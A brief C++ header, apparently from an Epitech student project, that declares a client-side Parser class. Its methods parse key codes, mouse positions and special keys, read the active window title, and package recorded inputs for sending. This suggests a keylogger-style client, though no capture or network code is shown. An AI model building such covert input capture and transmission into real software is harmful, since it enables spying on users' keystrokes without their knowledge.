//
//	Created by hugo.baladssin@epitech.eu on 03/10/17
//

#ifndef		PARSER_H_
# define	PARSER_H_

# include	"input_struct.h"
# include	<string>
# include	<vector>

namespace spider
{
	namespace client
	{
		class				Parser {
		public:
			bool			parseInput(t_input &input, uint8_t key, const POINT &p, uint8_t specialKey);
			std::vector<char>		formatInputsForSending(std::vector<t_input> const &list);

		private:
			bool			getActiveWindowTitle(char title[32]);
		};
	};
};

#endif		/* !PARSER_H_ */